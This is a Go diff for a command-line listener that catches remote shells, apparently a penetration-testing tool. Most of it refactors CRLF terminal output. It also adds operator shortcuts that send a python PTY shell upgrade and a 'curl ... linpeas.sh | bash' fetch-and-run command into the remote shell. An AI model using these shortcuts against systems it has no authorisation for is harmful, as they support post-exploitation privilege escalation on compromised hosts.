@@ -84,7 +84,12 @@ var listenCmd = &cobra.Command{
 	Use:     "listen [host] <port>",
 	Aliases: []string{"l"},
 	Short:   "Start a listener for incoming connections",
-	Long:    `Start a TCP listener on the specified port and optionally host.`,
+	Long: `Start a TCP listener on the specified port and optionally host.
+
+In relay mode, operator shortcuts are intercepted locally instead of
+being sent to the remote shell:
+  shell    Upgrade the remote shell to an interactive PTY shell
+  linpeas  Fetch and run linpeas on the remote host`,
 	Args:    cobra.RangeArgs(1, 2),
 	Run:     runListen,
 }
@@ -631,7 +636,7 @@ func handleConnection(conn net.Conn) {
 	// terminal rendering compounds into garbage.
 	if !foregroundMu.TryLock() {
 		logger.Warn("Connection from %s is in the background (stdin is owned by another connection)", conn.RemoteAddr())
-		if _, err := io.Copy(os.Stdout, applyProtocolWrappers(conn)); err != nil {
+		if _, err := io.Copy(ttyCRLFWriter(os.Stdout), applyProtocolWrappers(conn)); err != nil {
 			logger.Debug("Background connection ended: %v", err)
 		}
 		return
@@ -653,6 +658,16 @@ func handleConnection(conn net.Conn) {
 	if err != nil {
 		logger.Error("Connection handling error: %v", err)
 	}
+}
+
+// ttyCRLFWriter wraps w with LF-to-CRLF conversion when w is an
+// interactive terminal. Remote shells without a PTY send bare LF,
+// which slides diagonally on terminals in raw mode.
+func ttyCRLFWriter(w io.Writer) io.Writer {
+	if f, ok := w.(*os.File); ok && term.IsTerminal(int(f.Fd())) {
+		return &crlfWriter{writer: w}
+	}
+	return w
 }
 
 // splitHostPort extracts IP and port from a net.Addr without panicking on
@@ -730,6 +745,7 @@ func handleSessionConnection(conn net.Conn) {
 
 	// Keep connection alive: read from the session and pipe to stdout if attached
 	sess.PumpActive = true
+	ttyOut := ttyCRLFWriter(os.Stdout)
 	buf := make([]byte, 16384)
 	for {
 		n, err := sess.Recv(buf)
@@ -740,10 +756,32 @@ func handleSessionConnection(conn net.Conn) {
 		if n > 0 {
 			sess.HandleOutput(buf[:n])
 			if sess.IsAttached {
-				os.Stdout.Write(buf[:n])
+				ttyOut.Write(buf[:n])
 			}
 		}
 	}
+}
+
+// relayShortcuts are operator commands intercepted locally in relay mode
+// instead of being forwarded to the remote shell.
+var relayShortcuts = map[string]string{
+	// Upgrade the raw socket shell to an interactive PTY shell.
+	"shell": `python3 -c 'import pty; pty.spawn("/bin/sh")'`,
+	// Fetch and run linpeas on the remote host.
+	"linpeas": `curl -sL https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash`,
+}
+
+// runRelayShortcut handles one input line locally. It reports whether the
+// line was consumed (true) or must be forwarded to the remote shell.
+func runRelayShortcut(line string, conn net.Conn) bool {
+	cmd, ok := relayShortcuts[strings.TrimSpace(line)]
+	if !ok {
+		return false
+	}
+	if _, err := conn.Write([]byte(cmd + "\n")); err != nil {
+		logger.Error("Shortcut write failed: %v", err)
+	}
+	return true
 }
 
 func handleNormal(conn net.Conn) error {
@@ -777,10 +815,8 @@ func handleNormal(conn net.Conn) error {
 	}
 	if listenCRLFMode {
 		stdoutWriter = &crlfWriter{writer: stdoutWriter}
-	} else if f, ok := stdoutWriter.(*os.File); ok && term.IsTerminal(int(f.Fd())) {
-		// Remote shells without a PTY send bare LF; terminals need CRLF,
-		// otherwise output slides diagonally across the screen.
-		stdoutWriter = &crlfWriter{writer: stdoutWriter}
+	} else {
+		stdoutWriter = ttyCRLFWriter(stdoutWriter)
 	}
 
 	if listenSendOnly {
@@ -898,6 +934,9 @@ func handleNormal(conn net.Conn) error {
 					}
 					return
 				}
+				if runRelayShortcut(line, conn) {
+					continue
+				}
 				if _, err := conn.Write([]byte(line + "\n")); err != nil {
 					return
 				}
@@ -1002,6 +1041,8 @@ func handleInteractive(conn net.Conn) error {
 		if listenCRLFMode {
 			logger.Debug("CRLF mode enabled in interactive: converting LF to CRLF")
 			stdoutWriter = &crlfWriter{writer: os.Stdout}
+		} else {
+			stdoutWriter = ttyCRLFWriter(stdoutWriter)
 		}
 
 		for {
@@ -1060,6 +1101,8 @@ func handleLocalInteractive(conn net.Conn) error {
 	var stdoutWriter io.Writer = os.Stdout
 	if listenCRLFMode {
 		stdoutWriter = &crlfWriter{writer: os.Stdout}
+	} else {
+		stdoutWriter = ttyCRLFWriter(stdoutWriter)
 	}
 
 	// Done channel for clean shutdown
